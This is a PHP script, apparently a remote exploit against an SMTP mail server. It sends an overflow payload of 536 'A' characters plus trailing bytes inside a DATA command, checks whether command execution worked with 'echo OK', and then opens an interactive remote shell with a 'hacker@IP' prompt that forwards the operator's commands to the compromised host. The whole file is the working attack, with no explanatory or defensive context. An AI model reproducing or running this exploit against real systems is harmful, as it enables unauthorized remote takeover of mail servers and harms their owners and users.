<?php

	$IP=$_SERVER['argv'][1];
	$PORT=$_SERVER['argv'][2];

	if(("" != "$PORT") && ( "" != "$IP" )){

		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		socket_set_option($socket,SOL_SOCKET, SO_RCVTIMEO, array("sec"=>5, "usec"=>0));

		if($socket == false){

			die();

		}

		if(socket_connect($socket, $IP, $PORT)){

			$EXPLOIT="mail from: lalala\nrcpt to: lalala\ndata\n".str_repeat("A",536)."\x2d\x22\x40\n";

			socket_write($socket, $EXPLOIT, strlen($EXPLOIT));

			socket_read($socket, 2048);
			sleep(2);

			$comando="echo OK\n";
			socket_write($socket,$comando,strlen($comando));
			$verifica=socket_read($socket, 2048);

			if($verifica != "OK\n"){

				echo "El exploit no se ha ejecutado con Ã©xito.\n";

			}else{

				echo "Exploit ejecutado con exito. Para salir escriba EXIT\n\n";

				while(1==1){

					echo "hacker@".$IP.":$ ";

					$comando=fgets(STDIN);

					if($comando == "EXIT\n"){
			
						$comando="exit\n";
						socket_write($socket,$comando,strlen($comando));

						socket_close($socket);

						break;

					}

					socket_write($socket,$comando,strlen($comando));

					echo(socket_read($socket, 2048));

				}

			}
		}

	}

?>
